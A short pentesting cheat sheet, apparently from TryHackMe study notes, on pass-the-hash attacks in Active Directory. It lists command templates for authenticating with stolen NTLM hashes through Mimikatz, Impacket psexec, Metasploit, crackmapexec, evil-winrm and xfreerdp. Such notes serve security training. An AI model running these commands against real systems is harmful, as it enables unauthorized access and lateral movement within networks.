#cme #mimikatz #msf #evil-winrm #xfreerdp 
# Pass The Hash
- As [NetNTLM](../AD%20Basics/NetNTLM.md) is inherently flawed, the password hash can be treated as a password.
- NTLM hash can be used to directly authenticate to a domain/service
- [Mimikatz](../../Cheatsheet/Mimikatz.md) for extracting Credentials
### Mimikatz
```powershell
sekurlsa::pth /user:user.name /domain:za.tryhackme.com /ntlm:<hash> /run:<command>
```
### Impacket's PsExec.py
```bash
python psexec.py -hashes <hash> domain/username@<server/ip>
```
### Metasploit PsExec module
```
exploit/windows/smb/psexec
```
### Crackmapexec
```bash
crackmapexec smb <server/IP> -u username -H <hash>
```
### evil-winrm
```bash
evil-winrm -i <server/IP> -u <username> -H <hash>
```
### xfreerdp
```bash
xfreerdp /v:<server/IP> /u:<domain\username> /pth:<hash> 
```